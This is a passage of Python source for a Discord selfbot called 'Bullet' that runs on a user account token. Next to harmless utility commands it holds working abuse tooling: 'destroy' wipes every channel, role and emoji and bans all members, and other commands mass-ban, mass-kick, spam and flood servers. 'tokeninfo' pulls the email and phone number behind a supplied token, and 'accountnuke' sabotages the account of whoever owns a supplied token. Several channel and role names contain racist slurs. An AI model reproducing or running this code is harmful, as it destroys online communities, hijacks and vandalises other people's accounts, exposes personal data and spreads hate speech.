    await ctx.message.delete()
    em = discord.Embed(title=ctx.guild.name)
    em.set_image(url=ctx.guild.banner_url)
    await ctx.send(embed=em)

@Bullet.command(aliases=["guildinfo"])
async def serverinfo(ctx):
    await ctx.message.delete()
    date_format = "%a, %d %b %Y %I:%M %p"
    embed = discord.Embed(title=f"{ctx.guild.name}",
                          description=f"{len(ctx.guild.members)} Members\n {len(ctx.guild.roles)} Roles\n {len(ctx.guild.text_channels)} Text-Channels\n {len(ctx.guild.voice_channels)} Voice-Channels\n {len(ctx.guild.categories)} Categories",
                          timestamp=datetime.datetime.utcnow(), color=discord.Color.blue())
    embed.add_field(name="Server created at", value=f"{ctx.guild.created_at.strftime(date_format)}")
    embed.add_field(name="Server Owner", value=f"{ctx.guild.owner}")
    embed.add_field(name="Server Region", value=f"{ctx.guild.region}")
    embed.add_field(name="Server ID", value=f"{ctx.guild.id}")
    embed.set_thumbnail(url=f"{ctx.guild.icon_url}")
    await ctx.send(embed=embed)

@Bullet.command(aliases=['pfp', 'avatar'])
async def av(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    format = "gif"
    user = user or ctx.author
    if user.is_avatar_animated() != True:
        format = "png"
    avatar = user.avatar_url_as(format=format if format != "gif" else None)
    async with aiohttp.ClientSession() as session:
        async with session.get(str(avatar)) as resp:
            image = await resp.read()
    with io.BytesIO(image) as file:
        await ctx.send(file=discord.File(file, f"Avatar.{format}"))


@Bullet.command(aliases = ["userinfo", "aboutuser"])
async def whois(ctx, member : discord.Member = None):
    member = ctx.author if not member else member
    
    roles = [role for role in member.roles]
    
    embed = discord.Embed(colour=0xF1C40F, timestamp=ctx.message.created_at)
    
    embed.set_author(name=f"{member}", icon_url=ctx.author.avatar_url)
    
    embed.set_thumbnail(url=member.avatar_url)
    
    embed.set_footer(text=f"ID: {member.id}")

    embed.add_field(name="Joined:", value=member.joined_at.strftime("%a, %b %d, %Y, %I:%M %p"), inline=True)
    
    embed.add_field(name="Registered:", value=member.created_at.strftime("%a, %b %d, %Y, %I:%M %p"), inline=True)
    
    embed.add_field(name=f"Roles [{len(roles)}]", value=" ".join([role.mention for role in roles]), inline=False)
    
    await ctx.send(embed=embed)

@Bullet.command()
async def timer(ctx,seconds):
    try:
        secondint = int(seconds)
        message = await ctx.send(f"Timer: {seconds}")

        while True:
            secondint -= 1
            if secondint == 0:
                await message.edit(content="Ended!")
                break
            await message.edit(content=f"Timer: {secondint}")
            await asyncio.sleep(1)
        await ctx.send("Countdown Ended")
    except:
        pass

@tasks.loop()
async def type(ctx):
    await ctx.channel.trigger_typing()

@Bullet.command()
async def typingstart(ctx):
    await ctx.send("Started")
    type.start(ctx)

@Bullet.command()
async def typingstop(ctx):
    await ctx.send("Stopped")
    type.stop()

@Bullet.command()
async def cat(ctx):
    await ctx.message.delete()
    r = requests.get("https://api.thecatapi.com/v1/images/search").json()
    link = str(r[0]["url"])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        embe = discord.Embed(colour=discord.Color(random.randint(0x000000, 0xFFFFFF)))
        embe.set_image(url=link)
        await ctx.send(embed=embe)
    except:
        await ctx.send(link)

@Bullet.command(aliases=['wouldyourather'])
async def wyr(ctx):  # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://www.conversationstarters.com/wyrqlist.php').text
    soup = bs4(r, 'html.parser')
    qa = soup.find(id='qa').text
    qb = soup.find(id='qb').text
    message = await ctx.send(f"{qa}\nor\n{qb}")
    await message.add_reaction("🅰")
    await message.add_reaction("🅱")


@Bullet.command()
async def joke(ctx):  # b'\xfc'
    await ctx.message.delete()
    headers = {
        'Authorization': "Bot " + token,
        "Accept": "application/json"
    }
    async with aiohttp.ClientSession()as session:
        async with session.get("https://icanhazdadjoke.com", headers=headers) as req:
            r = await req.json()
    await ctx.send(r["joke"])

@Bullet.command(aliases=["img", "searchimg", "searchimage", "imagesearch", "imgsearch"])
async def image(ctx, *, args):
    await ctx.message.delete()
    url = 'https://unsplash.com/search/photos/' + args.replace(" ", "%20")
    page = requests.get(url)
    soup = bs4(page.text, 'html.parser')
    image_tags = soup.findAll('img')
    if str(image_tags[2]['src']).find("https://trkn.us/pixel/imp/c="):
        link = image_tags[2]['src']
        try:
            msg = discord.Embed(title=f"Search result for: **{args}** ",colour=discord.Color(random.randint(0x000000, 0xFFFFFF)))
            msg.set_image(url=link)
            await ctx.send(embed=msg)
        except:
            msg = discord.Embed(title=f"Search result for: **{args}** ",colour=discord.Color(random.randint(0x000000, 0xFFFFFF)))
            
            await ctx.send(embed=msg)
    else:
        await ctx.send("Nothing found for **" + args + "**")

# @Bullet.command()
# async def cat(ctx):
#     await ctx.message.delete()
#     r = requests.get("https://api.thecatapi.com/v1/images/search").json()
#     link = str(r[0]["url"])
#     em = discord.Embed(color=discord.Color(random.randint(0x000000, 0xFFFFFF)))
#     em.set_image(url=str(r['message']))
#     try:
#         await ctx.send(embed=em)
#     except:
#         await ctx.send(str(r['message']))

@Bullet.command()
async def dog(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://dog.ceo/api/breeds/image/random").json()
    em = discord.Embed(color=discord.Color(random.randint(0x000000, 0xFFFFFF)))
    em.set_image(url=str(r['message']))
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(str(r['message']))    

@Bullet.command()
async def b64encode(ctx, *,string: str): # b'\xfc'
    await ctx.message.delete()
    decoded_stuff = base64.b64encode('{}'.format(string).encode('ascii'))
    encoded_stuff = str(decoded_stuff)
    encoded_stuff = encoded_stuff[2:len(encoded_stuff)-1]
    await ctx.send(encoded_stuff) 

@Bullet.command()
async def b64decode(ctx, *,string: str): # b'\xfc'+
    await ctx.message.delete()  
    strOne = (string).encode("ascii")
    pad = len(strOne)%4
    strOne += b"="*pad
    encoded_stuff = codecs.decode(strOne.strip(),'base64')
    decoded_stuff = str(encoded_stuff)
    decoded_stuff = decoded_stuff[2:len(decoded_stuff)-1]
    await ctx.send(decoded_stuff)

@Bullet.command()
async def pp(ctx,member:discord.Member):
    size = random.randint(1, 15)
    dong = ""
    for _i in range(0, size):
        dong += "="
    em = discord.Embed(title=f"{member.name}'s PP size", description=f"8{dong}D", colour=0x0000)
    await ctx.send(embed=em)

@Bullet.command()
async def shorturl(ctx, *, link): # b'\xfc'
    await ctx.message.delete()
    r = requests.get(f'http://tinyurl.com/api-create.php?url={link}').text
    em = discord.Embed()
    em.add_field(name='Shortened link', value=r, inline=False )
    await ctx.send(embed=em)

@Bullet.command()
async def topic(ctx):  # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://www.conversationstarters.com/generator.php').content
    soup = bs4(r, 'html.parser')
    topic = soup.find(id="random").text
    await ctx.send(topic)


@Bullet.command(name='ping')
async def ping(ctx):
    await ctx.message.delete()
    await ctx.send(f'My Ping Is: {round(Bullet.latency * 1000)}ms')

@Bullet.command(aliases=["logout"])
async def shutdown(ctx):
    await ctx.message.delete()
    await Bullet.logout()

@Bullet.command()
async def reverse(ctx, *, message):
    await ctx.message.delete()
    message = message[::-1]
    await ctx.send(message)

@Bullet.command()
async def clearmyhistory(ctx, amount: int = None):
    await ctx.message.delete()
    if amount is None:
        async for message in ctx.message.channel.history(limit=999).filter(lambda m: m.author == Bullet.user).map(
                lambda m: m):
            try:
                await message.delete()
            except:
                pass
    else:
        async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == Bullet.user).map(
                lambda m: m):
            try:
                await message.delete()
            except:
                pass

@Bullet.command(aliases=["purgebans", "unbanall"])
async def massunban(ctx):
    await ctx.message.delete()
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass

@Bullet.command(pass_context=True, aliases=["cyclename", "autoname", "autonick", "cycle"])
async def cyclenick(ctx, *, text):
    await ctx.message.delete()
    global cycling
    cycling = True
    while cycling:
        name = ""
        for letter in text:
            name = name + letter
            await ctx.message.author.edit(nick=name)


@Bullet.command(aliases=["stopcyclename", "cyclestop", "stopautoname", "stopautonick", "stopcycle"])
async def stopcyclenick(ctx):
    await ctx.message.delete()
    global cycling
    cycling = False

@Bullet.command()
async def dynoban(ctx):
    await ctx.message.delete()
    for member in list(ctx.guild.members):
        message = await ctx.send("?ban " + member.mention)
        await message.delete()
        await asyncio.sleep(1.5)


@Bullet.command(alises=["game"])
async def playing(ctx, *, message):
    if message is None:
        await Bullet.change_presence(activity="BlackTown")
    else:
        await ctx.message.delete()
    game = discord.Game(
        name=message
    )
    await Bullet.change_presence(activity=game)
    await ctx.send(f"Status changed to: `Playing {message}` this may take a bit to change")
        

@Bullet.command()
async def streaming(ctx, *,status: str=None):
    if status is None:
        await Bullet.change_presence(activity="BlackTown")
    else:
        try:
            game = discord.Activity(type=1, name=f"{status}", url="https://www.twitch.tv/PewDiePie")
            await Bullet.change_presence(activity=game)
            await ctx.send(f"Status changed to: `Streaming {status}` this may take a bit to change")
        except Exception as e:
            await ctx.send(f"Error: {e}")
@Bullet.command()
async def listening(ctx, *,status: str=None):
    if status is None:
        await Bullet.change_presence(activity="BlackTown")
    else:
        try:
            game = discord.Activity(type=2, name=f"{status}")
            await Bullet.change_presence(activity=game)
            await ctx.send(f"Status changed to: `Listening {status}` this may take a bit to change")
        except Exception as e:
            await ctx.send(f"Error: {e}")
@Bullet.command()
async def watching(ctx, *,status: str=None):
    if status is None:
        await Bullet.change_presence(activity="BlackTown")
    else:
        try:
            game = discord.Activity(type=3, name=f"{status}")
            await Bullet.change_presence(activity=game)
            await ctx.send(f"Status changed to: `Watching {status}` this may take a bit to change")
        except Exception as e:
            await ctx.send(f"Error: {e}")

@Bullet.command()
async def removestatus(ctx):

    try:
        game = discord.Activity(type=-1)
        await Bullet.change_presence(activity=game)
        await ctx.send(f"Status removed")
    except Exception as e:
        await ctx.send(f"Error: {e}")
        
@Bullet.command()
async def usertoken(ctx, user: discord.Member = None):
    await ctx.message.delete()
    list = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U",
            "V", "W", "X", "Y", "Z", "_"'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o',
            'p', 'q', 'r', 's', 't', 'u',
            'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '.']
    token = random.choices(list, k=84)
    if user is None:
        user = ctx.author
        await ctx.send(user.mention + "'s token is " + ''.join(token))        
    else:
        await ctx.send(user.mention + "'s token is " + "".join(token))

@Bullet.command()
async def gfuck(ctx):
    await ctx.message.delete()
    try:
        await ctx.guild.edit(
            name=("Get fucked my nigga"),
            description="fucked by Bullet",
            reason=f"fucked by {ctx.author}",
            icon=None,
            banner=None
        )
        print("changed the name to Get nuked my nigga")
    except:
        pass

@Bullet.command()
async def ascii(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
    if len('```'+r+'```') > 2000:
        return
    await ctx.send(f"```{r}```")

@Bullet.command()
async def tr(ctx):
    for _i in range(200):
        await ctx.guild.create_text_channel(name="Get Nuked Nigga")
        print(f"Created Channel: Suck My Cock Nigger")
    for _i in range(200):
        await ctx.guild.create_role(name="FUCKED BY BlackTown User", color=discord.Color(random.randint(0x000000, 0xFFFFFF)))
        print(f"Created Role: FUCKED BY BlackTown User")


@Bullet.command()
async def crash(ctx):
    for x in range(50):
        await ctx.send(asciigen(size=1999))
        await ctx.send(asciigen(size=1999))
        await ctx.send(asciigen(size=1999))        


@Bullet.command()
async def spameveryone(ctx):
    try:
        channels = ctx.guild.text_channels
        for channel in channels:
            if channel.permissions_for(ctx.me).send_messages:
                for i in range(5):
                    await channel.send("@everyone")
            print(f"Tagged Everyone in channel: {channel}")
    except:
        pass

words = ['Stop waiting for exceptional things to just happen.',
                     'The lyrics of the song sounded like fingernails on a chalkboard.',
                     'I checked to make sure that he was still alive.', 'We need to rent a room for our party.',
                     'He had a hidden stash underneath the floorboards in the back room of the house.',
                     'Your girlfriend bought your favorite cookie crisp cereal but forgot to get milk.',
                     'People generally approve of dogs eating cat food but not cats eating dog food.',
                     'I may struggle with geography, but I\'m sure I\'m somewhere around here.',
                     'She was the type of girl who wanted to live in a pink house.',
                     'The bees decided to have a mutiny against their queen.',
                     'She looked at the masterpiece hanging in the museum but all she could think is that her five-year-old could do better.',
                     'The stranger officiates the meal.', 'She opened up her third bottle of wine of the night.',
                     'They desperately needed another drummer since the current one only knew how to play bongos.',
                     'He waited for the stop sign to turn to a go sign.',
                     'His thought process was on so many levels that he gave himself a phobia of heights.',
                     'Her hair was windswept as she rode in the black convertible.',
                     'Karen realized the only way she was getting into heaven was to cheat.',
                     'The group quickly understood that toxic waste was the most effective barrier to use against the zombies.',
                     'It was obvious she was hot, sweaty, and tired.', 'This book is sure to liquefy your brain.',
                     'I love eating toasted cheese and tuna sandwiches.', 'If you don\'t like toenails',
                     'You probably shouldn\'t look at your feet.',
                     'Wisdom is easily acquired when hiding under the bed with a saucepan on your head.',
                     'The spa attendant applied the deep cleaning mask to the gentleman’s back.',
                     'The three-year-old girl ran down the beach as the kite flew behind her.',
                     'For oil spots on the floor, nothing beats parking a motorbike in the lounge.',
                     'They improved dramatically once the lead singer left.',
                     'The Tsunami wave crashed against the raised houses and broke the pilings as if they were toothpicks.',
                     'Excitement replaced fear until the final moment.', 'The sun had set and so had his dreams.',
                     'People keep telling me "orange" but I still prefer "pink".',
                     'Someone I know recently combined Maple Syrup & buttered Popcorn thinking it would taste like caramel popcorn. It didn’t and they don’t recommend anyone else do it either.',
                     'I liked their first two albums but changed my mind after that charity gig.',
                     'Plans for this weekend include turning wine into water.',
                     'A kangaroo is really just a rabbit on steroids.',
                     'He played the game as if his life depended on it and the truth was that it did.',
                     'He\'s in a boy band which doesn\'t make much sense for a snake.',
                     'She let the balloon float up into the air with her hopes and dreams.',
                     'There was coal in his stocking and he was thrilled.',
                     'This made him feel like an old-style rootbeer float smells.',
                     'It\'s not possible to convince a monkey to give you a banana by promising it infinite bananas when they die.',
                     'The light in his life was actually a fire burning all around him.',
                     'Truth in advertising and dinosaurs with skateboards have much in common.',
                     'On a scale from one to ten, what\'s your favorite flavor of random grammar?',
                     'The view from the lighthouse excited even the most seasoned traveler.',
                     'The tortoise jumped into the lake with dreams of becoming a sea turtle.',
                     'It\'s difficult to understand the lengths he\'d go to remain short.',
                     'Nobody questions who built the pyramids in Mexico.',
                     'They ran around the corner to find that they had traveled back in time.']

time = [3,4,2,5,1,7,6]

@tasks.loop(count=5000)
async def farm(ctx):        
    await asyncio.sleep(random.choice(time))
    message = await ctx.send(random.choice(words))
    await asyncio.sleep(random.choice(time))
    await message.delete()

@Bullet.command()
async def farmstart(ctx):
    await ctx.message.delete()
    await ctx.send("starting now, To Stop Type $farmstop",delete_after=3)
    farm.start(ctx)

@Bullet.command()
async def farmstop(ctx):
    await ctx.send("Alright Stopping now",delete_after=3)
    farm.stop()   

start_time = datetime.datetime.utcnow()

@Bullet.command()
async def uptime(ctx):
    await ctx.message.delete()
    now = datetime.datetime.utcnow()
    delta = now - start_time
    hours, remainder = divmod(int(delta.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    days, hours = divmod(hours, 24)
    if days:
        time_format = "**{d}** days, **{h}** hours, **{m}** minutes, and **{s}** seconds."
    else:
        time_format = "**{h}** hours, **{m}** minutes, and **{s}** seconds."
    uptime_stamp = time_format.format(d=days, h=hours, m=minutes, s=seconds)
    await ctx.send(uptime_stamp)

@Bullet.command()
async def reall(ctx, nickname):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.edit(nick=nickname)
        except:
            pass

@Bullet.command()
async def adminservers(ctx):
    await ctx.message.delete()
    admins = []
    bots = []
    kicks = []
    bans = []
    for guild in Bullet.guilds:
        if guild.me.guild_permissions.administrator:
            admins.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.manage_guild and not guild.me.guild_permissions.administrator:
            bots.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.ban_members and not guild.me.guild_permissions.administrator:
            bans.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.kick_members and not guild.me.guild_permissions.administrator:
            kicks.append(discord.utils.escape_markdown(guild.name))
    adminPermServers = f"**Servers with Admin ({len(admins)}):**\n{admins}"
    botPermServers = f"\n**Servers with BOT_ADD Permission ({len(bots)}):**\n{bots}"
    banPermServers = f"\n**Servers with Ban Permission ({len(bans)}):**\n{bans}"
    kickPermServers = f"\n**Servers with Kick Permission ({len(kicks)}:**\n{kicks}"
    await ctx.send(adminPermServers + botPermServers + banPermServers + kickPermServers)

    

@Bullet.command(aliases=['rainbowrole'])
async def rainbow(ctx, *, role: discord.Role):
    await ctx.message.delete()
    while True:
        try:
            for i in range(0x98304, 0xFFFFF):
                await role.edit(role=role, colour=i)
                print(hex(i))
        except:
            break
 
@Bullet.command()
async def spread(ctx,*,message:str):
  await ctx.message.delete()
  for user in Bullet.user.friends:
    try:
      await user.send(message)
      print(f"Message sent to : {user.name} <")
    except:
       print(f"Message declined for : {user.name} <")

@Bullet.command(aliases=['tokinfo', 'tdox'])
async def tokeninfo(ctx, _token):
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
            '%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        headers = {
            'Authorization': "Bot " + _token,
            'Content-Type': 'application/json'
        }
        try:
            res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
            res = res.json()
            user_id = res['id']
            locale = res['locale']
            avatar_id = res['avatar']
            language = languages.get(locale)
            creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
                '%d-%m-%Y %H:%M:%S UTC')
            em = discord.Embed(
                description=f"Name: `{res['username']}#{res['discriminator']} ` **BOT**\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
            
            fields = [
                {'name': 'Flags', 'value': res['flags']},
                {'name': 'Local language', 'value': res['locale'] + f"{language}"},
                {'name': 'Verified', 'value': res['verified']},
                {'name': 'SelfBot Creator', 'value': 'BULLET#1000'},
            ]
            for field in fields:
                if field['value']:
                    em.add_field(name=field['name'], value=field['value'], inline=False)
                    em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
            return await ctx.send(embed=em)
        except KeyError:
            await ctx.send("Invalid token")
    em = discord.Embed(
        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
    # em.set_footer(text=_token)
    nitro_type = "None"
    if "premium_type" in res:
        if res['premium_type'] == 2:
            nitro_type = "Nitro Premium"
        elif res['premium_type'] == 1:
            nitro_type = "Nitro Classic"
    fields = [
        {'name': 'Phone', 'value': res['phone']},
        {'name': 'Flags', 'value': res['flags']},
        {'name': 'Local language', 'value': res['locale'] + f"{language}"},
        {'name': 'MFA', 'value': res['mfa_enabled']},
        {'name': 'Verified', 'value': res['verified']},
        {'name': 'Nitro', 'value': nitro_type},
        {'name': 'SelfBot Creator', 'value': 'BULLET#1000'},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em)


@Bullet.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
async def iplook(ctx, *, ipaddr: str = '1.3.3.7'):
    await ctx.message.delete()
    r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
    geo = r.json()
    em = discord.Embed()
    fields = [
        {'name': 'IP', 'value': geo['query']},
        {'name': 'Type', 'value': geo['ipType']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'City', 'value': geo['city']},
        {'name': 'Continent', 'value': geo['continent']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'Hostname', 'value': geo['ipName']},
        {'name': 'ISP', 'value': geo['isp']},
        {'name': 'Latitute', 'value': geo['lat']},
        {'name': 'Longitude', 'value': geo['lon']},
        {'name': 'Org', 'value': geo['org']},
        {'name': 'Region', 'value': geo['region']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=True)
    return await ctx.send(embed=em)

@Bullet.command()
async def massban(ctx):
    for member in list(ctx.guild.members):
        try:
            await member.ban()
        except discord.Forbidden:
            print(f"{member.name} has FAILED to be BANNED from {ctx.guild.name}")
        else:
            print(f"{member.name} has been BANNED from {ctx.guild.name}")
    
    # print("Action Completed: ball")  

@Bullet.command()
async def masskick(ctx):
    for member in list(ctx.guild.members):
        try:
            await member.kick()
        except discord.Forbidden:
            print(f"{member.name} has FAILED to be KICKED from {ctx.guild.name}")
        else:
            print(f"{member.name} has been KICKED from {ctx.guild.name}")

@Bullet.command(pass_context=True)
async def destroy(ctx):
    await ctx.message.delete()
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print (channel.name + " has been deleted")
        except:
            pass
        guild = ctx.message.guild
        channel = await guild.create_text_channel("Get Nuked")
        await channel.send("BlackTown Is Best")
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print (f"{role.name} has been deleted")
        except:
            pass
    for member in list(ctx.guild.members):
        try:
            await guild.ban(member)
            print ("User " + member.name + " has been banned")
        except:
            pass
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print (f"{emoji.name} has been deleted")
        except:
            pass    
    print("Action completed: Nuclear Destruction")



@Bullet.command(aliases=['changehypesquad'])
async def hypesquad(ctx, house):
    await ctx.message.delete()
    request = requests.Session()
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }
    if house == "bravery":
        payload = {'house_id': 1}
    elif house == "brilliance":
        payload = {'house_id': 2}
    elif house == "balance":
        payload = {'house_id': 3}
    elif house == "random":
        houses = [1, 2, 3]
        payload = {'house_id': random.choice(houses)}
    try:
        request.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
    except Exception as e:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)


@Bullet.command()
async def accountnuke(ctx, _token):
    await ctx.message.delete()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': None,
        'icon': None,
        'name': asciigen(size=26),
        'region': "europe"
    }
    for _i in range(50):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=payload)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=setting,
                              timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
            else:
                break

@Bullet.command()
async def accountfuck(ctx):
    await ctx.message.delete()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': None,
        'icon': None,
        'name': asciigen(size=26)
    }
    for _i in range(100):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=payload)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=setting,
                              timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
            else:
                break


@Bullet.command()
async def webspam(ctx,*,message:str):
    await ctx.message.delete()
    webie = await ctx.channel.create_webhook(name="SabkaBaapBullet")
    webhook = DiscordWebhook(url=webie.url, content=message)
    for i in range(40):
        try:
            webhook.execute(i)        
        except:
            await ctx.send("im being rated limited")
            break


@Bullet.event
async def on_command_error(ctx,error):
    if isinstance(error,commands.MissingPermissions):
        embed = discord.Embed(title="Missing Permissions",color=0xEE523A)
        await ctx.send(embed=embed)
    elif isinstance(error, commands.CommandNotFound):
        embed = discord.Embed(title="Command Not Found use $help for commands",color=0xEE523A)
        await ctx.send(embed=embed)
    if isinstance(error, commands.CommandOnCooldown):
        em = discord.Embed(title=f"Try again in {error.retry_after:.2f}s. i am on cooldown", color=0xFFF002)
        await ctx.send(embed=em,delete_after=10)
    elif isinstance(error, commands.MemberNotFound):
        embed = discord.Embed(title="Member Not Found",color=0xEE523A)
        await ctx.send(embed=embed)
    if isinstance(error,commands.MissingRequiredArgument):
        em = discord.Embed(title="You are missing proper format")
        await ctx.send(embed=em)


@Bullet.command()
async def webdel(ctx):
    await ctx.message.delete()
    webhooks = await ctx.guild.webhooks()
    for webhook in webhooks:
        await webhook.delete()


#@webspam.error
#async def webspam_error(error):
 #   if isinstance(error,commands.CommandInvokeError):
#        print("you have removed maxium number of webhooks")
    




@Bullet.command()
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(message)

@Bullet.command(aliases=["spamchangegcname", "changegcname"])
async def spamgcname(ctx,message):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        watermark = message
        name = "gg/RV8saAKMAC "
        for letter in watermark:
            name = name + letter
            await ctx.message.channel.edit(name=name)

@Bullet.command()
async def kickgc(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        for recipient in ctx.message.channel.recipients:
            await ctx.message.channel.remove_recipients(recipient)

# activity_change.start()

Bullet.run(token,bot=False,reconnect=True)



######################FIX SNIPE AND EDITSNIPE$$$$$$$$$$$$$